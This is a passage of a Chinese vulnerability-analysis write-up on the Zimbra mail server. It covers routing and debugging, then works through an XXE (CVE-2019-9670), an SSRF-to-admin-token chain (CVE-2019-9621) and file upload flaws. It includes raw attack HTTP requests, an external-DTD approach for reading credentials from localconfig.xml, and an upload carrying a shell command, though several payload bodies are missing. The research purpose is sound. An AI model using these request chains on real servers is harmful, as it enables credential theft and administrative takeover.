            # For audit
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            # For Virtual Hosting
            set $virtual_host $http_host;
            if ($virtual_host = '') {
                set $virtual_host $server_addr:$server_port;
            }
            proxy_set_header Host            $virtual_host;
            proxy_redirect http://$http_host/ https://$http_host/;
            proxy_redirect http://$relhost/ https://$http_host/;
        }
location 后面的正则表示，一旦匹配成功那么此次请求的服务配置走当前location中的配置。proxy_pass
将流量转发到后面的别名服务上，上面的别名服务为zimbra_ssl，找到
/opt/zimbra/conf/nginx/includes/nginx.conf.web 中对应的ip和port
        upstream zimbra_ssl
        {
            server    zimbra-docker.zimbra.io:8443 fail_timeout=60s version=8.6.0_GA_1153;
            zmauth;
        }
###  0x3 Java web 服务
由端口进程对应关系来看，zimbra的java启动程序开启了多个java端口，如下图所示：
这些端口对应着不同的servlet并且在服务重启后会将重新缓存每个端口路由与servlet的映射关系。
servlet 缓存代码，为了加速web请求响应，将所有的额servlet放到cache中进行缓存。所以如果是第一次请求该路由，都会进入下面代码分支
最后所有的servlet分发都在ServletHolder.class中进行，通过servlet.service函数分发到对应的servlet
因为由不同的servlet进行处理，所以会出现一些断点断不下来的情况，这时要分清楚到底是走的那个servlet，我们只需要将断点设置在ServletHolder.class
的servlet.service(request, response)
## 0x04 漏洞调试
###  0x1 最新漏洞
CVE-2019-9670，CVE-2020-12846和CVE-2019-9621是近几年来爆出的最新漏洞，通过学习这两个漏洞的挖掘方法和漏洞成因，帮助我们更好的理解zimbra邮件系统的漏洞利用。
###  0x2 CVE-2019-9670 漏洞分析
**1\. 适用范围**
> 漏洞适用条件：8.7.4之前的版本，可以导致XML实体解析
**2\. 路由分析**
在Autodiscover路由中，可以在/opt/zimbra/mailboxd/etc/jetty.xml中找到对应的路由注册，下图为其中的一条配置
由图中的配置可以看出符合该路由的url都会转发到`/service/autodiscover`路由上
**3\. 漏洞调试**
利用burpsuit发送如下数据包
    POST /Autodiscover/Autodiscover.xml HTTP/1.1
    Host: 192.168.0.127
    Connection: keep-alive
    Content-Length: 347
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
    X-Zimbra-Csrf-Token: 0_c76c85d9f2471cf79b6cda4eab2363d8aa41e0a3
    Accept: */*
    Origin: https://192.168.0.127
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.0.127/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ZM_TEST=true;ZA_SKIN=serenity;
    ]>
          aaaaa
          &xxe;
在关键代码上设置断点，分析如下：
通过`doc.getElementsByTagName("Request")` 获取到xml结构中Request以下的所有节点
接下来利用for循环便利解析到的节点，利用getTagValue获取相对应标签中的值，代码如下图所示。
之后通过sendError函数将responseSchema字符串值带到response回显中
最后的效果如下：
**4\. payload构造**
接下来构造payload读zimbra的配文件localconfig.xml，由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd：
这里将下面的xml放置到1.1.1.1服务器上，
    ">
    ">
/opt/zimbra/conf/localconfig.xml
中存储了zimbra的关键配置信息，读取配置文件中的zimbra_user和zimbra_ldap_password
            %dtd;
            %all;
            ]>
            aaaaa
            &fileContents;
###  0x3 CVE-2019-9670 漏洞后续利用分析
利用xxe获取/opt/zimbra/conf/localconfig.xml 中的用户名和密码， 通过soap接口获取低权限token。
**1\. Zimbra soap协议**
Zimbra soap协议的描述文档  
Admin SOAP API –
User SOAP API –
Full SOAP API – 
对应的jar包为zimbrastore.jar
在jar包中com.zimbra.cs.service.account中有着许许多多的handler调用
wsdl 中的element元素方法去掉Requests后缀就是zimbrastore.jar中的处理类。
**2\. 调试soap协议**
为了调试soap协议我们在HttpServlet.class中下断点
最后由SoapServlet.class 进行处理，在其中通过请求分发的方式由SoapEngine解析分发出去
最后由AccountDocumentHandler 子类Auth的handle方法调用
**3\. 获取低权限token**
发送下面soap包即可获得低权限token
    POST /service/soap HTTP/1.1
    Host: 192.168.0.134
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.22.0
    Content-Length: 453
            zimbra
            ZN5CYxE10
###  0x4 CVE-2019-9621 漏洞分析
**1\. 适用范围**
> 8.6 patch 13, 8.7.x before 8.7.11 patch 10, and 8.8.x before 8.8.10 patch 7
> or 8.8.x before 8.8.11 patch 3 通过 ProxyServlet 组件可以实现SSRF
**2\. 关键代码分析**
可以利用该漏洞通过SSRF访问admin接口获取高权限token，由ProxyServlet进行路由处理，关键代码如下：
zimbrastore.jar!/com/zimbra/cs/zimlet/ProxyServlet.class
在doProxy函数中首先获取了cookie中的ZM_ADMIN_AUTH_TOKEN值并赋值给authToken同时这里检验了authToken的权限（如果没有任何权限，则赋值为空），当authToken不为null时就会进入代理转发，如下图所示：
最后利用传递过去的target参数创建URL对象，获取/service/proxy的请求类型以及请求body，新建PostMethod对象并赋值给method参数，通过执行HttpClientUtil.executeMethod方法将method参数传递过去并执行。
**3\. 获取高权限token分析**
此数据包中的Cookie由/service/soap提供，发送同/service/soap内容，但是AuthRequest的xmlns要改为：urn:zimbraAdmin，否则获取的还是普通权限的Token
    POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.22.0
    Cookie: ZM_ADMIN_AUTH_TOKEN=0_57d26651159b7e02e5c507e2f5e15e8512601728_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313630323235353237303330393b747970653d363a7a696d6272613b7469643d393a3336393535383031383b;
    Host: foo:7071
    Content-Type: application/xml
    Content-Length: 451
            zimbra
            ZN5CYxE10
通过ssrf
访问`https://127.0.0.1:7071/service/admin/soap`之后，来到了之前分析的soap协议处理代码部分。通过SoapEngine转发到相关处理代码
还记得之前的位于account目录下的auth.class吗，这次的auth类位于admin认证下，由这个类的handle负责处理。
获取过soap协议的password之后，带入到ldap进行authAccount认证，之后将认证通过的cookie通过getAuthToken函数进行获取，如下图代码所示：
最后获取高权限admin 的Token
###  0x5 低版本文件上传漏洞
**1\. 适用范围**
> ZimbraCollaboration Server 8.8.11 之前的版本
**2\. servlet 分析**
/service/extension/clientUploader/upload 对应 ExtensionDispatcherServlet  
在获取请求方法之后，根据不同方法的处理逻辑用if判断分别路由，文件上传请求最后触发handler.doPost(req, resp)函数
对应的jar包在/opt/zimbra/lib/ext/com_zimbra_clientuploader/com_zimbra_clientuploader.jar，因此分析时需要单独将jar包添加在idea的依赖当中
**3\. 处理逻辑分析**
进入到ClientUploadHandler.class进行处理，doPost方法接收到请求后，处理上传的文件内容
之后调用man.uploadClient函数进行post data处理，提取文件名并保存至文件。
进行目录拼接，最后文件存储在/opt/zimbra/jetty/webapps/zimbra/downloads
在download目录可以看到文件上传成功
###  0x5 CVE-2020-12846 漏洞分析
**1\. 适用范围**
> Zimbra before 8.8.15 Patch 10 and 9.x before 9.0.0 Patch 3
漏洞描述：在/service/upload servlet
潜在的威胁，用户上传的可执行文件（exe,sh,bat,jar）将会保存在/opt/zimbra/data/tmp/upload/ 有可能导致任意命令执行。
**2\. 路由分析**
构造如下数据包，发送到服务
    POST /service/upload?lbfums= HTTP/1.1
    Host: 192.168.0.134
    Connection: close
    Content-Length: 15
    Cache-Control: no-cache
    X-Zimbra-Csrf-Token: 0_38c319c70c81c56eed17aad5e35812fa21001948
    X-Requested-With: XMLHttpRequest
    Content-Disposition: attachment; filename="/tmp/sss.sh"
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
    Content-Type: image/png;
    Accept: */*
    Origin: https://192.168.0.134
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.0.134/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ZM_TEST=true; ZM_AUTH_TOKEN=0_8b9e5ad6b5a6bd4187ddf6d643878ef8b46f8095_69643d33363a65373732363130352d646234652d346264322d616265392d3761306163373763333366373b6578703d31333a313630323137303035333339303b747970653d363a7a696d6272613b7469643d393a3738343036353232323b76657273696f6e3d31333a382e362e305f47415f313135333b637372663d313a313b; ZM_ADMIN_AUTH_TOKEN=0_627eb9423481a632a34a4f127477ff846abdafd6_69643d33363a65373732363130352d646234652d346264322d616265392d3761306163373763333366373b6578703d31333a313630323034323732313033303b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313737393534363132383b76657273696f6e3d31333a382e362e305f47415f313135333b; JSESSIONID=12djzn3t02efa9d03k80lut35
    touch /tmp/aaa
由HttpServlet接受并处理，最后由zimbrastore.jar!/com/zimbra/cs/service/FileUploadServlet.class处理
**3\. 漏洞分析**
在doPost入口处获取了admin token并进行判断，如果合法则继续，所以该文件上传漏洞必须在admin权限下。
接下来检验csrftoken的合法性，如果不合法也是直接结束
获取请求参数lbfums赋值给limitByFileUploadMaxSize，判断Content-Type类型进入MultipartUpload和PlainUpload两个分支。
最后临时文件存储在 /opt/zimbra/data/tmp/upload/
最后关于该漏洞的利用大家可以一起讨论下
## 0x05 总结
本文从zimbra java web的部署，调试环境搭建，框架梳理，漏洞分析等多个方面介绍了关于zimbra
开源邮件系统的分析方法，总结了一些分析经验，关于zimbra的漏洞挖掘和分析仍有很多方面没有研究清楚，之后将会对zimbra子模块功能进行详细的分析，希望大家一起来参与讨论。
## 0x06 参考文献